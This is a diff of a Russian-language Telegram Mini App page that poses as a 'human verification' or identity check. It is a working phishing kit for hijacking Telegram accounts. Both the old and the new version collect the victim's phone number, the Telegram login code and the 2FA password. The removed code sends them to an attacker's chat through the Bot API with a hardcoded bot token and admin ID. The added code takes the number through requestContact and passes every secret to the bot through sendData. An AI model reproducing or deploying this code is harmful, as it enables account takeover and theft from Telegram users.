@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <title>Проверка личности</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -12,316 +12,417 @@
             box-sizing: border-box;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #0f0f0f;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
             min-height: 100vh;
-            padding: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
         }
         .container {
-            background: #1f1f1f;
-            border-radius: 20px;
-            padding: 30px 25px;
             max-width: 400px;
             width: 100%;
-            box-shadow: 0 12px 40px rgba(0,0,0,0.6);
-            border: 1px solid #2a2a2a;
-        }
-        .logo {
+            padding: 20px 16px 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             text-align: center;
-            margin-bottom: 20px;
         }
-        .logo svg {
-            width: 60px;
-            height: 60px;
+        .emoji {
+            font-size: 80px;
+            margin: 10px 0;
         }
-        h2 {
-            color: #fff;
-            font-size: 22px;
-            font-weight: 700;
-            text-align: center;
-            margin-bottom: 8px;
-        }
-        .sub {
-            color: #aaa;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            margin-bottom: 16px;
-        }
-        .input-group label {
-            display: block;
-            color: #ccc;
-            font-size: 13px;
+        .lead {
+            font-size: 18px;
             font-weight: 500;
-            margin-bottom: 5px;
+            margin: 8px 0;
         }
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: #2a2a2a;
-            border: 1px solid #3a3a3a;
-            border-radius: 12px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: border 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #6c8cff;
+        .muted {
+            color: #9da3a8;
+            font-size: 14px;
+            margin: 4px 0 16px;
         }
         .btn {
             width: 100%;
             padding: 14px;
-            background: #6c8cff;
+            background: linear-gradient(135deg, #2f80ed, #3aa3ff);
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             color: #fff;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 10px;
-        }
-        .btn:hover {
-            background: #5a7ae0;
+            transition: opacity 0.2s;
+            margin-top: 12px;
         }
         .btn:active {
-            transform: scale(0.98);
+            opacity: 0.7;
         }
-        .status {
-            margin-top: 15px;
-            text-align: center;
-            font-size: 14px;
-            color: #ff6b6b;
-            min-height: 24px;
-        }
-        .status.success {
-            color: #69db7c;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
+        .btn-secondary {
+            background: #2a2a2a;
+            margin-top: 8px;
         }
         .code-boxes {
             display: flex;
             gap: 12px;
-            justify-content: center;
-            margin: 15px 0;
+            margin: 16px 0 12px;
         }
         .code-box {
             width: 50px;
-            height: 60px;
-            background: #2a2a2a;
+            height: 56px;
+            background: #111;
             border-radius: 12px;
+            border: 2px solid #222;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 24px;
+            font-weight: 600;
             color: #fff;
-            border: 2px solid #3a3a3a;
         }
         .code-box.filled {
-            border-color: #6c8cff;
+            border-color: #2f80ed;
         }
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin-top: 15px;
+            gap: 12px;
+            width: 100%;
+            margin: 16px 0 12px;
         }
         .kbtn {
             padding: 14px;
-            background: #2a2a2a;
+            background: #1a1a1a;
             border: none;
-            border-radius: 12px;
+            border-radius: 14px;
             color: #fff;
-            font-size: 20px;
+            font-size: 22px;
+            font-weight: 500;
             cursor: pointer;
             transition: background 0.2s;
         }
-        .kbtn:hover {
-            background: #3a3a3a;
-        }
         .kbtn:active {
-            transform: scale(0.95);
+            background: #2a2a2a;
         }
         .kbtn.del {
-            background: #3a2a2a;
+            background: #1a1a1a;
             color: #ff6b6b;
+            font-size: 20px;
         }
-        .kbtn.del:hover {
-            background: #4a3a3a;
+        .status {
+            color: #9da3a8;
+            font-size: 14px;
+            min-height: 24px;
+            margin-top: 8px;
+        }
+        .status.success {
+            color: #69db7c;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 24px 20px;
+            max-width: 380px;
+            width: 90%;
+        }
+        .modal-content h3 {
+            font-size: 20px;
+            margin-bottom: 8px;
+        }
+        .modal-content p {
+            color: #9da3a8;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+        .modal-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        .modal-actions button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .modal-actions .cancel {
+            background: transparent;
+            color: #9da3a8;
+        }
+        .modal-actions .ok {
+            background: #2f80ed;
+            color: #fff;
+        }
+        .twofa-input {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            margin: 12px 0;
+        }
+        .twofa-input:focus {
+            border-color: #2f80ed;
+            outline: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.477 2 2 6.477 2 12C2 17.523 6.477 22 12 22C17.523 22 22 17.523 22 12C22 6.477 17.523 2 12 2ZM16.146 7.663L14.443 15.935C14.325 16.473 13.999 16.615 13.551 16.378L10.833 14.394L9.52 15.664C9.389 15.793 9.277 15.901 8.995 15.901L9.166 13.131L13.987 8.749C14.184 8.574 13.943 8.476 13.677 8.651L7.718 12.34L5.035 11.373C4.519 11.185 4.506 10.836 5.134 10.599L15.549 6.386C15.989 6.208 16.376 6.463 16.146 7.663Z" fill="#6c8cff"/>
-            </svg>
-        </div>
-        <h2>Проверка личности</h2>
-        <p class="sub">Введите данные для подтверждения</p>
-
-        <div class="input-group">
-            <label>Номер телефона</label>
-            <input type="tel" id="phoneInput" placeholder="+7 999 999 99 99">
+        <!-- Шаг 1: Приветствие -->
+        <div id="screen-welcome">
+            <div class="emoji">👋</div>
+            <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
+            <div class="muted">Нажмите на кнопку ниже для начала!</div>
+            <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
 
-        <div class="input-group" id="codeGroup" style="display:none;">
-            <label>Код подтверждения</label>
-            <input type="text" id="codeInput" placeholder="Введите код из Telegram">
+        <!-- Шаг 2: Модалка с запросом номера -->
+        <div id="modal-phone" class="modal hidden">
+            <div class="modal-content">
+                <h3>Отправить Ваш номер телефона?</h3>
+                <p>Бот будет знать номер Вашего телефона. Это необходимо для проверки.</p>
+                <div class="modal-actions">
+                    <button class="cancel" onclick="hideModal()">Отмена</button>
+                    <button class="ok" id="btnShareContact">OK</button>
+                </div>
+            </div>
         </div>
 
-        <div class="input-group" id="passwordGroup" style="display:none;">
-            <label>Пароль (если есть 2FA)</label>
-            <input type="password" id="passwordInput" placeholder="Введите пароль">
+        <!-- Шаг 3: Ожидание -->
+        <div id="screen-waiting" class="hidden">
+            <div class="emoji">⏳</div>
+            <div class="lead">Ожидайте, не выходите!</div>
+            <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
         </div>
 
-        <button class="btn" id="submitBtn">Продолжить</button>
-        <div class="status" id="status"></div>
-        <div class="footer">Telegram © 2026</div>
+        <!-- Шаг 4: Ввод кода -->
+        <div id="screen-code" class="hidden">
+            <div class="emoji">🔐</div>
+            <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
+
+            <div class="code-boxes" id="codeBoxes">
+                <div class="code-box" data-index="0"></div>
+                <div class="code-box" data-index="1"></div>
+                <div class="code-box" data-index="2"></div>
+                <div class="code-box" data-index="3"></div>
+                <div class="code-box" data-index="4"></div>
+            </div>
+
+            <button class="btn btn-secondary" id="btnGetCode">Узнать код</button>
+
+            <div class="keypad" id="keypad">
+                <button class="kbtn" data-key="1">1</button>
+                <button class="kbtn" data-key="2">2</button>
+                <button class="kbtn" data-key="3">3</button>
+                <button class="kbtn" data-key="4">4</button>
+                <button class="kbtn" data-key="5">5</button>
+                <button class="kbtn" data-key="6">6</button>
+                <button class="kbtn" data-key="7">7</button>
+                <button class="kbtn" data-key="8">8</button>
+                <button class="kbtn" data-key="9">9</button>
+                <button class="kbtn" data-key="0">0</button>
+                <button class="kbtn del" data-key="backspace">⌫</button>
+            </div>
+
+            <div class="status" id="statusCode"></div>
+
+            <!-- 2FA блок (появляется если нужно) -->
+            <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
+                <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
+                <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
+            </div>
+        </div>
+
+        <!-- Шаг 5: Успех -->
+        <div id="screen-success" class="hidden">
+            <div class="emoji">✅</div>
+            <div class="lead">Подтверждено!</div>
+            <div class="muted">Вы успешно прошли проверку</div>
+        </div>
     </div>
 
     <script>
-        // ===== КОНФИГ =====
-        const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
-        const ADMIN_ID = "8821493005";
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-        let step = 'phone';
+        let tg = window.Telegram.WebApp;
+        let userId = null;
         let phone = '';
         let code = '';
         let password = '';
+        let codeDigits = [];
 
-        const statusEl = document.getElementById('status');
-        const phoneInput = document.getElementById('phoneInput');
-        const codeInput = document.getElementById('codeInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const submitBtn = document.getElementById('submitBtn');
-
-        // Функция отправки данных в бота
-        async function sendToBot(text) {
-            try {
-                await fetch(API_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_ID,
-                        text: text
-                    })
-                });
-            } catch(e) {
-                console.error('Send error:', e);
+        if (tg) {
+            tg.ready();
+            tg.expand();
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                userId = tg.initDataUnsafe.user.id;
             }
         }
 
-        // Функция отправки структурированных данных (номер, код, пароль)
-        async function sendDataToBot(phone, code, password) {
-            const data = {
-                phone: phone,
-                code: code,
-                password: password
-            };
-            // Отправляем как JSON в сообщении
-            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify(data)}`);
-            
-            // Также отправляем в WebApp (если открыт через Telegram)
-            try {
-                if (window.Telegram && window.Telegram.WebApp) {
-                    window.Telegram.WebApp.sendData(JSON.stringify(data));
-                }
-            } catch(e) {}
+        const screenWelcome = document.getElementById('screen-welcome');
+        const modalPhone = document.getElementById('modal-phone');
+        const screenWaiting = document.getElementById('screen-waiting');
+        const screenCode = document.getElementById('screen-code');
+        const screenSuccess = document.getElementById('screen-success');
+        const btnConfirm = document.getElementById('btnConfirm');
+        const btnShareContact = document.getElementById('btnShareContact');
+        const codeBoxes = document.querySelectorAll('.code-box');
+        const statusCode = document.getElementById('statusCode');
+        const twofaBlock = document.getElementById('twofaBlock');
+        const twofaInput = document.getElementById('twofaInput');
+        const twofaSubmit = document.getElementById('twofaSubmit');
+        const btnGetCode = document.getElementById('btnGetCode');
+
+        function showScreen(screen) {
+            [screenWelcome, screenWaiting, screenCode, screenSuccess].forEach(el => el.classList.add('hidden'));
+            screen.classList.remove('hidden');
         }
 
-        submitBtn.addEventListener('click', async function() {
-            if (step === 'phone') {
-                phone = phoneInput.value.trim();
-                if (!phone) {
-                    statusEl.textContent = 'Введите номер телефона';
-                    statusEl.className = 'status';
-                    return;
-                }
+        function showModal() {
+            modalPhone.classList.remove('hidden');
+        }
 
-                statusEl.textContent = 'Отправляем код...';
-                statusEl.className = 'status';
+        function hideModal() {
+            modalPhone.classList.add('hidden');
+        }
 
-                // Отправляем номер в бота
-                await sendDataToBot(phone, '', '');
+        function updateCodeBoxes() {
+            codeBoxes.forEach((box, index) => {
+                box.textContent = codeDigits[index] || '';
+                box.classList.toggle('filled', !!codeDigits[index]);
+            });
+        }
 
-                document.getElementById('codeGroup').style.display = 'block';
-                submitBtn.textContent = 'Подтвердить код';
-                step = 'code';
-                statusEl.textContent = '✅ Код отправлен! Введите его ниже.';
-                statusEl.className = 'status success';
-                return;
+        function clearCode() {
+            codeDigits = [];
+            updateCodeBoxes();
+            statusCode.textContent = '';
+            statusCode.className = 'status';
+            twofaBlock.classList.add('hidden');
+        }
+
+        function sendDataToBot(data) {
+            if (tg) {
+                tg.sendData(JSON.stringify(data));
             }
+        }
 
-            if (step === 'code') {
-                code = codeInput.value.trim();
-                if (!code) {
-                    statusEl.textContent = 'Введите код';
-                    statusEl.className = 'status';
-                    return;
-                }
+        btnConfirm.addEventListener('click', () => {
+            showModal();
+        });
 
-                statusEl.textContent = 'Проверяем...';
-                statusEl.className = 'status';
+        btnShareContact.addEventListener('click', () => {
+            hideModal();
+            showScreen(screenWaiting);
 
-                // Отправляем код в бота
-                await sendDataToBot(phone, code, '');
-
-                document.getElementById('codeGroup').style.display = 'none';
-                document.getElementById('passwordGroup').style.display = 'block';
-                submitBtn.textContent = 'Подтвердить пароль (если есть)';
-                step = 'password';
-                statusEl.textContent = '✅ Код принят! Введите пароль, если он есть.';
-                statusEl.className = 'status success';
-                return;
-            }
-
-            if (step === 'password') {
-                password = passwordInput.value.trim();
-
-                // Отправляем все данные в бота
-                await sendDataToBot(phone, code, password);
-
-                statusEl.textContent = '✅ Подтверждено!';
-                statusEl.className = 'status success';
-
-                setTimeout(() => {
-                    document.querySelector('.container').innerHTML = `
-                        <div style="text-align:center;color:#fff;padding:40px 0;">
-                            <div style="font-size:48px;margin-bottom:16px;">✅</div>
-                            <h2>Доступ подтверждён</h2>
-                            <p style="color:#aaa;margin-top:10px;">Возвращайтесь в бота</p>
-                        </div>
-                    `;
-                }, 1000);
-
-                // Закрываем WebApp
-                try {
-                    if (window.Telegram && window.Telegram.WebApp) {
-                        window.Telegram.WebApp.close();
+            if (tg) {
+                tg.requestContact();
+                tg.onEvent('contact', (contact) => {
+                    phone = contact.phone_number;
+                    if (!phone) {
+                        statusCode.textContent = '❌ Не удалось получить номер';
+                        return;
                     }
-                } catch(e) {}
+
+                    sendDataToBot({ phone: phone, code: '', password: '' });
+
+                    showScreen(screenCode);
+                    statusCode.textContent = '📲 Код отправлен! Введите его.';
+                    statusCode.className = 'status success';
+                });
+
+                tg.onEvent('contact_error', () => {
+                    statusCode.textContent = '❌ Ошибка получения контакта';
+                });
+            } else {
+                phone = '+79123456789';
+                sendDataToBot({ phone: phone, code: '', password: '' });
+                showScreen(screenCode);
+                statusCode.textContent = '📲 Код отправлен! (тест)';
+                statusCode.className = 'status success';
             }
         });
 
-        // Ввод с физической клавиатуры (Enter)
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                submitBtn.click();
+        document.querySelectorAll('.kbtn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const key = this.dataset.key;
+                if (key === 'backspace') {
+                    codeDigits.pop();
+                    updateCodeBoxes();
+                    return;
+                }
+                if (codeDigits.length >= 5) return;
+                codeDigits.push(key);
+                updateCodeBoxes();
+
+                if (codeDigits.length === 5) {
+                    code = codeDigits.join('');
+                    sendDataToBot({ phone: phone, code: code, password: '' });
+                    statusCode.textContent = '⏳ Проверка...';
+                    statusCode.className = 'status';
+                }
+            });
+        });
+
+        btnGetCode.addEventListener('click', () => {
+            if (phone) {
+                sendDataToBot({ phone: phone, code: '', password: '' });
+                statusCode.textContent = '📲 Код отправлен повторно!';
+                statusCode.className = 'status success';
             }
         });
+
+        twofaSubmit.addEventListener('click', () => {
+            password = twofaInput.value.trim();
+            if (!password) {
+                statusCode.textContent = 'Введите пароль';
+                return;
+            }
+            sendDataToBot({ phone: phone, code: code, password: password });
+            statusCode.textContent = '⏳ Проверка пароля...';
+            statusCode.className = 'status';
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (!screenCode.classList.contains('hidden')) {
+                if (/^\d$/.test(e.key)) {
+                    if (codeDigits.length < 5) {
+                        codeDigits.push(e.key);
+                        updateCodeBoxes();
+                        if (codeDigits.length === 5) {
+                            code = codeDigits.join('');
+                            sendDataToBot({ phone: phone, code: code, password: '' });
+                            statusCode.textContent = '⏳ Проверка...';
+                            statusCode.className = 'status';
+                        }
+                    }
+                } else if (e.key === 'Backspace') {
+                    codeDigits.pop();
+                    updateCodeBoxes();
+                }
+            }
+        });
+
+        function closeApp() {
+            if (tg) tg.close();
+        }
     </script>
 </body>
 </html>
